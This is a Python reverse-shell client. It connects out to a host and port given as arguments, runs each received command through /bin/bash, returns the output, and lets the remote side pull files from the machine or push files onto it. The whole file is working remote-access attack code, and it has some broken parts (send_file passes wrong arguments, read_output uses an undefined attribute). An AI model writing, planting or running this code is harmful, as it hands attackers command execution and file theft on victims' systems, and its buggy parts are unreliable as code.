from utils import NO_OUTPUT_SIGNAL
import subprocess
import argparse
import select
import socket
import os

# Constants

SENDING_FILE = b"sendingfile"
GETTING_FILE = b"gettingfile"

def connect_to_host(host, port):
    """Establishes a connection to the host."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def receive_file(filename, sock):
    """Receives a file from the socket and writes it to the local system."""
    with open(filename, "wb") as f:
        sock.sendall(b"0")
        while (data := sock.recv(1024)):
            f.write(data)

def send_file(filename, sock):
    """Reads a file from the local system and sends it through the socket."""
    with open(filename, "rb") as f:
        send_response(f.read(), len(f.read()))

def change_directory(cmd, folder, s):
    try:
        os.chdir(folder)
        stdout_value = NO_OUTPUT_SIGNAL.encode()
    except FileNotFoundError:
        stdout_value = f"error: {folder} not found".encode()
    finally:
        message_length = len(stdout_value)
        s.sendall(message_length.to_bytes(4, byteorder="big"))
        s.sendall(stdout_value)

def handle_file_transfers(data, s):
    """Handles file transfers based on the received data."""
    if data.decode().split(" ")[0] == "cd":
        cmd = data.decode().split(" ")[0]
        folder = data.decode().split(" ")[1]
        change_directory(cmd, folder, s)
        return True
    if SENDING_FILE in data:
        file = data.decode().split("sendingfile/")[1].split(" &&")[0].strip()
        receive_file(file, s)
        return True
    if GETTING_FILE in data:
        file = data.decode().split("gettingfile/")[1].split(" &&")[0].strip()
        send_file(file, s)
        return True
    return False

class Shell:
    def __init__(self):
        self.end_marker = "END_OF_COMMAND" # TODO: This shouldnt be needed

    def execute_command(self, command):
        completed_process = subprocess.run(["/bin/bash", "-c", command],
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE)

        return completed_process.stdout, completed_process.stderr

    def read_output(self):
        out, err = b"", b""
        while True:
            reads = [self.proc.stdout.fileno(), self.proc.stderr.fileno()]
            ret = select.select(reads, [], [], 0.1)

            for fd in ret[0]:
                if fd == self.proc.stderr.fileno():
                    err += self.proc.stderr.read1()
                if fd == self.proc.stdout.fileno():
                    chunk = self.proc.stdout.read1()
                    out += chunk
                    if self.end_marker.encode() in chunk:
                        return out[:-len(self.end_marker)], err

def execute_command(data, shell, socket):
    """Executes a command and sends the response back through the socket."""
    stdout_value, stderr_value = shell.execute_command(data.decode("utf-8"))
    msg = f"{stdout_value.decode()}{stderr_value.decode()}".encode()
    message_length = len(msg)
    
    send_response(msg, socket, message_length)

def send_response(msg, socket, message_length):
    if message_length > 0:
        socket.sendall(message_length.to_bytes(4, byteorder="big"))
        socket.sendall(msg)
    else:
        stdout_value = NO_OUTPUT_SIGNAL.encode()
        message_length = len(stdout_value)
        socket.sendall(message_length.to_bytes(4, byteorder="big"))
        socket.sendall(stdout_value)

def netloop(socket):
    """Receives commands from the socket, executes them and sends back the response."""
    shell = Shell()
    while True:
        data = socket.recv(1024)

        if not data:
            break
        if handle_file_transfers(data, socket):
            continue

        try:
            execute_command(data, shell, socket)
        except BrokenPipeError:
            print("Connection closed by the host.")
            break

def main():
    """Main function to parse arguments and start execution."""
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port", type=int)

    args = parser.parse_args()

    socket = connect_to_host(args.host, args.port)
    netloop(socket)

if __name__ == "__main__":
    main()
